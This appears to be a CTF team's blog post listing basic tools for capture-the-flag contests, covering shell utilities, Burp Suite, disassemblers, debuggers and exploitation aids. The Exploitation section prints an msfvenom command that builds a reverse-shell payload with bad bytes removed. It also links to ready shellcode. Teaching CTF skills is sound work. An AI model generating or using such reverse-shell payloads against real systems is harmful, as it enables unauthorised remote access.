---
layout: post
title: "Basic Tools"
categories: learning
author: saelo
---

CTFs are about the skill, not about the tools. Still, you'll need a couple of tools to be successful.\\
In general a good advice is to get used to working with the OS shell. There's really **a lot** of things you can do **very** quickly and effectively if you know your way around bash/zsh/*your_favourite_shell_here* and python or *your_favourite_scripting_language_here*.

Get used to curl, bash for + while loops, grep, pipes, file redirection, command substitution, fifos, ... you name it. Also choose a decent text editor (vim, sublime, emacs, ... **not** nano or similar :P) and learn how to use it properly.

Try to stay away from tools that automate too much, you'll not learn anything from using them and they most likely won't help you solve the challenge. Automated tools definitely lack behind a skilled human :)


###General Tools

There's a couple of useful Unix tools you'll often need during CTFs. Some tools you should be familiar with:

Tool           | Description
-------------- | -----------------------------------------------------------------------------------------------
strings        | Search for strings in files, supports 8, 16 and 32 bit Unicode
-------------- | -----------------------------------------------------------------------------------------------
file           | Try to detect the file type based on magic byte sequences at the start of the file
-------------- | -----------------------------------------------------------------------------------------------
netcat/nc      | Connect to a remote tcp/udp/sctp server and talk to it from the command line
-------------- | -----------------------------------------------------------------------------------------------
hexdump/xxd    | View files and data in hexadecimal
-------------- | -----------------------------------------------------------------------------------------------
hexedit/ghex   | Edit files in hexadecimal
-------------- | -----------------------------------------------------------------------------------------------
strace/ltrace  | Trace the execution of a binary, log syscalls/library function calls
-------------- | -----------------------------------------------------------------------------------------------
wireshark      | View network traffic, either live or from a pcap file
-------------- | -----------------------------------------------------------------------------------------------


###Web Security

My favourite tool for doing any kind of web hacking is the [Burp Suite](http://portswigger.net/burp/). Burp Suite is a very powerful and flexible tool and the free version is usually sufficient. For a start you'll want to make yourself familiar with the Proxy and the Repeater. Also take a look at the Intruder at some point.\\
Oftentimes a combination of curl, grep and sometimes a bash loop or similar can work wonders too though.

Additionally make yourself familiar with how to make web requests from your favourite scripting language. For python I can recommend the [requests](http://docs.python-requests.org/en/latest/) package.

Moreover it might be a good idea to have a few VMs (try out [vagrant](https://www.vagrantup.com/)) or [docker](https://www.docker.com/) containers ready so you can quickly run some server side code locally to develop and debug your exploit.

Ultimately web hacking really isn't about (automated) tools, so don't start running some vuln discovery tool or directory bruteforcer against the web server, it will get you nowhere and will just put the organizers web servers under unnecessary load.


###Reverse Engineering

You'll need a disassembler: Basically you have the choice between [radare2](https://github.com/radare/radare2), [hopper](http://www.hopperapp.com/) and [IDA Pro](https://www.hex-rays.com/products/ida/) (there's a free/evaluation version available for both, hopper and IDA). IDA Pro is pretty much the industry standard tool for reverse engineering (and thus relatively pricey).

For debugging you'll definitely want to make yourself familiar with gdb. If you want an improved UI you can take a look at the .gdbinit from [here](https://github.com/gdbinit/Gdbinit) or try out [voltron](https://github.com/snare/voltron).

If you need to do reverse engineering and/or debugging on Windows, take a look at [x64dbg](http://x64dbg.com/#start), [OllyDbg](http://www.ollydbg.de/) or the [Immunity Debugger](http://debugger.immunityinc.com/). Also [WinDbg](http://www.windbg.org/) is very powerful, especially since it can do kernel level debugging (rarely needed during CTFs though).


###Exploitation

Since reverse engineering a binary is usually the first step towards developing an exploit for it, make sure to also read the section on reverse engineering.

For your exploit you can usually grab some shellcode from the internet, e.g. [this one](http://shell-storm.org/shellcode/files/shellcode-752.php), but msfvenom can be useful, too. For example

    ./msfvenom \
     -p linux/x86/shell_reverse_tcp \
     LHOST=$(curl icanhazip.com) \
     LPORT=4444 \
     -b '\x00\x0a\x0d' \
     -f python

will generate a reverse shell payload without zero bytes or newlines in it and spit it out as ready to use python code.\\
If you need to build a ROP payload, give [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) a try (metasploit has a similar utility called msfrop, but I found ROPgadget to work better most of the times).

Some other useful tools include the [checksec.sh](http://www.trapkit.de/tools/checksec.html) script to quickly check which mitigations are enabled on a binary, the [pattern_create](https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb) and [pattern_offset](https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb) scripts from metasploit to find various important offsets (e.g the offset from the start of a buffer to the saved return address on the stack), as well as the metasm shell (for example to quickly assemble a "jmp short 0x10" to jump over some corrupted part of the shellcode) or nasm (to build your own shellcode).

Also (shameless plug) take a look at our [ctfcode repository](https://github.com/kitctf/ctfcode) :)
